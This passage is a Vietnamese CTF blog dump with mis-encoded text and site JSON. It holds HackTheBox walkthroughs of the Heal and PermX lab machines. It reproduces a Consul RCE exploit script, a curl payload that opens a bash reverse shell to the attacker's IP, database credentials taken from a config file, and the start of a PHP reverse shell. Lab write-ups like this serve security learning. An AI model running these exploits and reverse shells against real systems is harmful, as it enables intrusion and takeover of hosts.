hiá»‡n zip láº¡i 1 láº§n ná»¯a.\nQuay trá»Ÿ láº¡i pháº§n install plugin phÃ­a trÃªn. Sau khi install, kiá»ƒm tra láº¡i Ä‘á»ƒ cháº¯c cháº¯n plugin Ä‘Ã£ install thÃ nh cÃ´ng\nBáº­t listener vá»›i port Ä‘Ã£ cáº¥u hÃ¬nh á»Ÿ cÃ¡c bÆ°á»›c trÆ°á»›c (tÃ´i Ä‘ang dÃ¹ng 9001) vÃ  má»Ÿ php revershell thá»§ cÃ´ng theo path /upload/plugins/Y1LD1R1M/php-rev.php trÃªn trÃ¬nh duyá»‡t.\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.46] 38064 Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 08:19:39 up 12:37, 0 users, load average: 0.02, 0.05, 0.01 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) NghiÃªn cá»©u vá» cÃ¢y thÆ° má»¥c cá»§a Limesurvey trÃªn github, tÃ´i tÃ¬m tháº¥y file chÆ°a user:pass cá»§a db trong application/config/config.php\nreturn array( \u0026#39;components\u0026#39; =\u0026gt; array( \u0026#39;db\u0026#39; =\u0026gt; array( \u0026#39;connectionString\u0026#39; =\u0026gt; \u0026#39;pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;\u0026#39;, \u0026#39;emulatePrepare\u0026#39; =\u0026gt; true, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;db_user\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;AdmiDi0_pA$$w0rd\u0026#39;, \u0026#39;charset\u0026#39; =\u0026gt; \u0026#39;utf8\u0026#39;, \u0026#39;tablePrefix\u0026#39; =\u0026gt; \u0026#39;lime_\u0026#39;, ), \u0026#39;session\u0026#39; =\u0026gt; array ( \u0026#39;sessionName\u0026#39;=\u0026gt;\u0026#39;LS-ZNIDJBOXUNKXWTIP\u0026#39;, // Uncomment the following lines if you need table-based sessions. // Note: Table-based sessions are currently not supported on MSSQL server. // \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;application.core.web.DbHttpSession\u0026#39;, // \u0026#39;connectionID\u0026#39; =\u0026gt; \u0026#39;db\u0026#39;, // \u0026#39;sessionTableName\u0026#39; =\u0026gt; \u0026#39;{{sessions}}\u0026#39;, ), \u0026#39;urlManager\u0026#39; =\u0026gt; array( \u0026#39;urlFormat\u0026#39; =\u0026gt; \u0026#39;path\u0026#39;, \u0026#39;rules\u0026#39; =\u0026gt; array( // You can add your own rules here ), \u0026#39;showScriptName\u0026#39; =\u0026gt; true, ), // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example: //\u0026#39;request\u0026#39; =\u0026gt; array( // \u0026#39;baseUrl\u0026#39; =\u0026gt; \u0026#39;/limesurvey\u0026#39;, //), ), ÄÄƒng nháº­p vÃ o pgsql\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.46] 35864 Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 09:49:08 up 14:06, 0 users, load average: 0.00, 0.01, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@heal:/$ psql -h localhost -p 5432 -U db_user -d survey psql -h localhost -p 5432 -U db_user -d survey Password for user db_user: AdmiDi0_pA$$w0rd psql (14.15 (Ubuntu 14.15-0ubuntu0.22.04.1)) SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off) Type \u0026#34;help\u0026#34; for help. survey=\u0026gt; SELECT * FROM lime_users; uid | users_name | password | full_name | parent_id | lang | email | htmleditormode | templateeditormode | questionselectormode | one_time_pw | dateformat | last_login | created | modified | validation_key | validation_key_expiration | last_forgot_email_password | expires | user_status -----+------------+--------------------------------------------------------------+---------------+-----------+------+----------------+----------------+--------------------+----------------------+-------------+------------+---------------------+----------------------------+----------------------------+----------------+---------------------------+----------------------------+---------+------------- 1 | ralph | $2y$10$qMS2Rbu5NXKCPI5i6rjQPexhhJk33kv3KNt4uNjJ5XEvV9hv.om/C | Administrator | 0 | en | ralph@heal.htb | default | default | default | | 1 | 2025-03-22 09:44:01 | 2024-09-27 10:37:34.356873 | 2025-03-22 09:44:01.945104 | | | | | 1 Tuy nhiÃªn váº«n chá»‰ lÃ  password cá»§a ralph nhÆ° trÃªn web. VÃ¬ Ä‘ang cÃ³ 1 pass á»Ÿ Ä‘Ã¢y, tÃ´i sáº½ thá»­ vá»›i táº¥t cáº£ user mÃ  tÃ´i cÃ³ thá»ƒ thá»­.\nSSH and User flag # www-data@heal:/$ su ralph su ralph Password: AdmiDi0_pA$$w0rd su: Authentication failure www-data@heal:/$ su ron su ron Password: AdmiDi0_pA$$w0rd ron@heal:/$ id id uid=1001(ron) gid=1001(ron) groups=1001(ron) ron@heal:/$ ron@heal:/$ cd cd ron@heal:~$ ls -la ls -la total 28 drwxr-x--- 3 ron ron 4096 Dec 9 15:13 . drwxr-xr-x 4 root root 4096 Dec 9 12:53 .. lrwxrwxrwx 1 root root 9 Dec 9 12:57 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ron ron 220 Dec 9 12:53 .bash_logout -rw-r--r-- 1 ron ron 3771 Dec 9 12:53 .bashrc drwx------ 2 ron ron 4096 Dec 9 15:13 .cache -rw-r--r-- 1 ron ron 807 Dec 9 12:53 .profile -rw-r----- 1 root ron 33 Mar 21 19:42 user.txt Privilege escalation # Sau khi thá»­ má»™t sá»‘ phÆ°Æ¡ng phÃ¡p mÃ  tÃ´i váº«n thÆ°á»ng lÃ m thÃ¬ Ä‘á»u khÃ´ng cÃ³ báº¥t ká»³ káº¿t quáº£ nÃ o Ä‘Ã¡ng ká»ƒ. Váº­y nÃªn cÃ¡ch cuá»‘i cÃ¹ng lÃ  táº£i lÃªn linpeas.sh vÃ  cho nÃ³ phÃ¢n tÃ­ch server nÃ y.\nÄá»ƒ Ã½ pháº§n active ports tÃ´i tháº¥y cÃ²n khÃ¡ nhiá»u port Ä‘ang má»Ÿ\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports tcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8600 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8500 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8503 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8300 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8301 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8302 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3001 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - TÃ´i sáº½ sá»­ dá»¥ng port forward thÃ´ng qua SSH Ä‘á»ƒ kiá»ƒm tra cÃ¡c port Ä‘ang má»Ÿ nÃ y. VÃ  sau khi thá»­ 1 lÆ°á»£t thÃ¬ tÃ´i tÃ¬m tháº¥y port 8500\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal] â””â”€$ sshpass -p \u0026#39;AdmiDi0_pA$$w0rd\u0026#39; ssh ron@10.10.11.46 -L 8500:127.0.0.1:8500 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sun Mar 23 03:42:54 PM UTC 2025 System load: 0.23 Usage of /: 81.4% of 7.71GB Memory usage: 31% Swap usage: 0% Processes: 278 Users logged in: 1 IPv4 address for eth0: 10.10.11.46 IPv6 address for eth0: dead:beef::250:56ff:feb9:24aa Expanded Security Maintenance for Applications is not enabled. 29 updates can be applied immediately. 18 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Mar 23 14:59:14 2025 from 10.10.14.25 ron@heal:~$ VÃ o web Ä‘á»ƒ kiá»ƒm tra\nÄá»ƒ Ã½ á»Ÿ gÃ³c dÆ°á»›i bÃªn trÃ¡i tÃ´i cÃ³ Consul v1.19.2. Thá»­ tÃ¬m lá»— há»•ng cá»§a tháº±ng nÃ y, tÃ´i tÃ¬m tháº¥y Hashicorp Consul v1.0 - RCE\nPhÃ¢n tÃ­ch má»™t chÃºt vá» PoC nÃ y\n# Exploit Title: Hashicorp Consul v1.0 - Remote Command Execution (RCE) # Date: 26/10/2022 # Exploit Author: GatoGamer1155, 0bfxgh0st # Vendor Homepage: https://www.consul.io/ # Description: Exploit for gain reverse shell on Remote Command Execution via API # References: https://www.consul.io/api/agent/service.html # Tested on: Ubuntu Server # Software Link: https://github.com/hashicorp/consul import requests, sys if len(sys.argv) \u0026lt; 6: print(f\u0026#34;\\n[\\033[1;31m-\\033[1;37m] Usage: python3 {sys.argv[0]} \u0026lt;rhost\u0026gt; \u0026lt;rport\u0026gt; \u0026lt;lhost\u0026gt; \u0026lt;lport\u0026gt; \u0026lt;acl_token\u0026gt;\\n\u0026#34;) exit(1) target = f\u0026#34;http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register\u0026#34; headers = {\u0026#34;X-Consul-Token\u0026#34;: f\u0026#34;{sys.argv[5]}\u0026#34;} json = {\u0026#34;Address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;check\u0026#34;: {\u0026#34;Args\u0026#34;: [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, f\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0\u0026gt;\u0026amp;1\u0026#34;], \u0026#34;interval\u0026#34;: \u0026#34;10s\u0026#34;, \u0026#34;Timeout\u0026#34;: \u0026#34;864000s\u0026#34;}, \u0026#34;ID\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Port\u0026#34;: 80} try: requests.put(target, headers=headers, json=json) print(\u0026#34;\\n[\\033[1;32m+\\033[1;37m] Request sent successfully, check your listener\\n\u0026#34;) except: print(\u0026#34;\\n[\\033[1;31m-\\033[1;37m] Something went wrong, check the connection and try again\\n\u0026#34;) TÃ´i cÃ³ thá»ƒ biáº¿n PoC nÃ y thÃ nh file python vÃ  cháº¡y. Tuy nhiÃªn lÃ  tÃ´i khÃ´ng cÃ³ acl_token nÃªn tÃ´i sáº½ sá»­ dá»¥ng 1 cÃ¡ch thá»§ cÃ´ng: lÃ  gá»­i 1 request register thÃ´ng qua curl vá»›i ná»™i dung chÃ­nh lÃ  pháº§n json cá»§a PoC trÃªn.\njson = {\u0026#34;Address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;check\u0026#34;: {\u0026#34;Args\u0026#34;: [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, f\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0\u0026gt;\u0026amp;1\u0026#34;], \u0026#34;interval\u0026#34;: \u0026#34;10s\u0026#34;, \u0026#34;Timeout\u0026#34;: \u0026#34;864000s\u0026#34;}, \u0026#34;ID\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Port\u0026#34;: 80} TrÆ°á»›c tiÃªn lÃ  pháº£i báº­t 1 listener vá»›i port tá»± chá»n, á»Ÿ Ä‘Ã¢y tÃ´i chá»n 9001\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... Gá»­i request báº±ng curl, thay Ä‘á»•i IP lÃ  mÃ¡y cá»§a tÃ´i vÃ  port mong muá»‘n - á»Ÿ Ä‘Ã¢y tÃ´i Ä‘ang dÃ¹ng 9001\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal] â””â”€$ curl -X PUT -d \u0026#39;{\u0026#34;Address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;check\u0026#34;: {\u0026#34;Args\u0026#34;: [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.25/9001 0\u0026gt;\u0026amp;1\u0026#34;], \u0026#34;interval\u0026#34;: \u0026#34;10s\u0026#34;, \u0026#34;Timeout\u0026#34;: \u0026#34;864000s\u0026#34;}, \u0026#34;ID\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;gato\u0026#34;, \u0026#34;Port\u0026#34;: 80}\u0026#39; http://127.0.0.1:8500/v1/agent/service/register Quay láº¡i listener\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/heal] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.25] from (UNKNOWN) [10.10.11.46] 36370 bash: cannot set terminal process group (149665): Inappropriate ioctl for device bash: no job control in this shell root@heal:/# id id uid=0(root) gid=0(root) groups=0(root) root@heal:/# cd root cd root root@heal:~# ls -la ls -la total 52 drwx------ 7 root root 4096 Mar 21 19:42 . drwxr-xr-x 19 root root 4096 Dec 8 13:57 .. lrwxrwxrwx 1 root root 9 Nov 29 11:50 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrc drwxr-xr-x 3 root root 4096 Dec 8 13:57 .bundle drwxr-xr-x 3 root root 4096 Dec 8 13:57 .cache -rwxr-xr-x 1 root root 658 Sep 27 12:16 cleanup-consul.sh drwxr-xr-x 3 root root 4096 Dec 8 13:57 .config -rwxr-xr-x 1 root root 863 Oct 7 03:23 consul-up.sh drwxr-xr-x 3 root root 4096 Dec 8 13:57 .local -rwxr-xr-x 1 root root 585 Dec 4 10:09 plugin_cleanup.sh -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rw-r----- 1 root root 33 Mar 21 19:42 root.txt drwx------ 2 root root 4096 Dec 8 13:57 .ssh ","date":"7 January 2025","externalUrl":null,"permalink":"/ctf/hackthebox/heal/","section":"Ctf","summary":"","title":"Hackthebox - Heal","type":"ctf"},{"content":"","date":"7 January 2025","externalUrl":null,"permalink":"/tags/limesurvey/","section":"Tags","summary":"","title":"Limesurvey","type":"tags"},{"content":"","date":"7 January 2025","externalUrl":null,"permalink":"/tags/pgsql/","section":"Tags","summary":"","title":"Pgsql","type":"tags"},{"content":"","date":"15 July 2024","externalUrl":null,"permalink":"/tags/chamilo/","section":"Tags","summary":"","title":"Chamilo","type":"tags"},{"content":"","date":"15 July 2024","externalUrl":null,"permalink":"/tags/cve-2023-4220/","section":"Tags","summary":"","title":"CVE-2023-4220","type":"tags"},{"content":"PermX lÃ  má»™t mÃ¡y Ä‘Æ¡n giáº£n lá»£i dá»¥ng lá»— há»•ng CVE-2023-4220 Ä‘á»ƒ upload shell vÃ  láº¥y rce.\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI= | 256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI 80/tcp open http syn-ack Apache httpd 2.4.52 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://permx.htb Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain permx.htb vÃ o file host. Truy cáº­p láº¡i thÃ¬ cÅ©ng khÃ´ng cÃ³ gÃ¬ thay Ä‘á»•i. Tuy nhiÃªn, khi cÃ³ domain thÃ¬ tÃ´i sáº½ nghÄ© Ä‘áº¿n viá»‡c tÃ¬m subdomain hoáº·c vhost\nSá»­ dá»¥ng ffuf\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/HTB/PermX] â””â”€$ ffuf -r -w /usr/share/seclists/Discovery/DNS/namelist.txt -u \u0026#34;http://permx.htb\u0026#34; -H \u0026#34;Host: FUZZ.permx.htb\u0026#34; -t 30 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://permx.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.permx.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 30 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ 5 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 64ms] 9 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 66ms] 01 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 69ms] 3 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 68ms] 6 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 79ms] 3com [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 79ms] a01 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 69ms] 4 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 79ms] 8 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 67ms] 02 [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 67ms] a [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 69ms] Táº¥t cáº£ Ä‘á»u lÃ  cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c, Ä‘iá»u nÃ y khÃ´ng Ä‘Ãºng láº¯m. Khi sá»­ dá»¥ng burpsuite Ä‘á»ƒ kiáº¿m tra Ä‘á»™ dÃ i cá»§a response thÃ¬ tÃ´i nháº­n Ä‘Æ°á»£c káº¿t quáº£ cÅ©ng lÃ  36182 giá»‘ng vá»›i size mÃ  ffuf Ä‘Ã£ quÃ©t ra Ä‘Æ°á»£c.\nTÃ´i sáº½ sá»­ dá»¥ng thÃªm 1 vÃ i options Ä‘á»ƒ bá» qua táº¥t cáº£ cÃ¡c káº¿t quáº£ cÃ³ size:36182 vÃ¬ tÃ´i biáº¿t cháº¯c cháº¯n nÃ³ khÃ´ng Ä‘Ãºng.\nTÃ´i sáº½ thÃªm -o Ä‘á»ƒ ffuf ghi káº¿t quáº£ ra file vÃ  dÃ¹ng grep Ä‘á»ƒ láº¥y ra cÃ¡c káº¿t quáº£ khÃ´ng pháº£i lÃ  36182\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight] â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.permx.htb\u0026#34; -u http://permx.htb -t 30 -o - | grep -v \u0026#34;36182\u0026#34; /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://permx.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.permx.htb :: Output file : - :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 30 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ lms [Status: 200, Size: 19347, Words: 397, Lines: 150, Duration: 121ms] ThÃªm nÃ³ vÃ o file host vÃ  truy cáº­p http://lms.permx.htb\nEnumeration # â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ whatweb http://lms.permx.htb http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge] TÃ´i cÃ³ 1 form Ä‘Äƒng nháº­p vÃ  cÃ³ 1 cÃ¡i tÃªn Chamilo 1. ÄÃ¢y cÃ³ thá»ƒ lÃ  trÃ¬nh quáº£n trá»‹ cá»§a site nÃ y vÃ  phiÃªn báº£n cá»§a nÃ³.\nThá»­ Ä‘Äƒng nháº­p vá»›i nhá»¯ng tÃ i khoáº£n Ä‘Æ¡n giáº£n nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£, tÃ´i sáº½ thá»­ tÃ¬m kiáº¿m cÃ¡c lá»— há»•ng Chamilo\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ searchsploit chamilo 1 ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Chamilo 1.8.7 / Dokeos 1.8.6 - Remote File Disclosure | php/webapps/16114.txt Chamilo LMS - Persistent Cross-Site Scripting | php/webapps/39474.txt Chamilo LMS 1.11.14 - Account Takeover | php/webapps/50694.txt Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated) | php/webapps/49867.py Chamilo LMS 1.11.8 - \u0026#39;firstname\u0026#39; Cross-Site Scripting | php/webapps/45536.txt Chamilo LMS 1.11.8 - Cross-Site Scripting | php/webapps/45535.txt Chamilo LMS 1.9.10 - Multiple Vulnerabilities | php/webapps/36435.txt Chamilo Lms 1.9.6 - \u0026#39;profile.php?password\u0026#39; SQL Injection | php/webapps/30012.txt Chamilo LMS 1.9.8 - Blind SQL Injection | php/webapps/36040.txt Chamilo LMS IDOR - \u0026#39;messageId\u0026#39; Delete POST Injection | php/webapps/39473.txt ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Thá»­ má»™t sá»‘ exploit Ä‘á»ƒ xem cÃ³ khai thÃ¡c Ä‘Æ°á»£c khÃ´ng. Sá»­ dá»¥ng msfconsole\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ msfconsole -q msf6 \u0026gt; search chamilo Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/chamilo_unauth_rce_cve_2023_34960 2023-06-01 excellent Yes Chamilo unauthenticated command injection in PowerPoint upload 1 \\_ target: PHP . . . . 2 \\_ target: Unix Command . . . . 3 \\_ target: Linux Dropper . . . . Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/chamilo_unauth_rce_cve_2023_34960 After interacting with a module you can manually set a TARGET with set TARGET \u0026#39;Linux Dropper\u0026#39; msf6 \u0026gt; use 1 [*] Additionally setting TARGET =\u0026gt; PHP [*] Using configured payload php/meterpreter/reverse_tcp msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; options Module options (exploit/linux/http/chamilo_unauth_rce_cve_2023_34960): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The Chamilo endpoint URL URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. When TARGET is 0: Name Current Setting Required Description ---- --------------- -------- ----------- WEBSHELL no The name of the webshell with extension. Webshell name will be randomly generated if left unset. Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PHP View the full module info with the info, or info -d command. Thiáº¿t láº­p cÃ¡c tÃ¹y chá»n\nmsf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; set rhosts lms.permx.htb rhosts =\u0026gt; lms.permx.htb msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.105 msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.105:4444 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [*] Checking if 10.10.11.23:80 can be exploited. [-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. No valid response received from the target. \u0026#34;set ForceExploit true\u0026#34; to override check result. [*] Exploit completed, but no session was created. msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; set ForceExploit true ForceExploit =\u0026gt; true msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.105:4444 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [*] Checking if 10.10.11.23:80 can be exploited. [!] The target is not exploitable. No valid response received from the target. ForceExploit is enabled, proceeding with exploitation. [*] Executing PHP for php/meterpreter/reverse_tcp [-] Exploit aborted due to failure: payload-failed: Web shell upload error. [*] Exploit completed, but no session was created. msf6 exploit(linux/http/chamilo_unauth_rce_cve_2023_34960) \u0026gt; Thá»­ tÃ¬m kiáº¿m cÃ¡c lá»— há»•ng khÃ¡c trÃªn internet, vÃ  tÃ´i tÃ¬m tháº¥y CVE-2023-4220. Lá»— há»•ng nÃ y cho phÃ©p táº£i file lÃªn server theo path /main/inc/lib/javascript/bigupload/inc + tÃªn file, vá»›i action post-unsupported. Cuá»‘i cÃ¹ng thá»±c thi revershell vá»«a táº£i lÃªn báº±ng cÃ¡ch sá»­ dá»¥ng curl Ä‘á»ƒ truy cáº­p vÃ o nÃ³.\nGaining access # Äáº§u tiÃªn, clone repo vá»\nâ”Œâ”€â”€(neoã‰¿n0b0dy)-[~/HTB/PermX/Chamilo-CVE-2023-4220-Exploit] â””â”€$ ll total 12 -rwxr-xr-x 1 neo neo 2471 Jul 15 15:05 CVE-2023-4220.sh -rw-r--r-- 1 neo neo 1205 Jul 15 15:05 README.md Tiáº¿p theo, tÃ´i cáº§n 1 revershell. Sá»­ dá»¥ng pentestmonkey cho Ä‘Æ¡n giáº£n, thay tháº¿ IP vÃ  port cá»§a mÃ¬nh.\n\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.10.14.105\u0026#39;; $port = 4444; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { 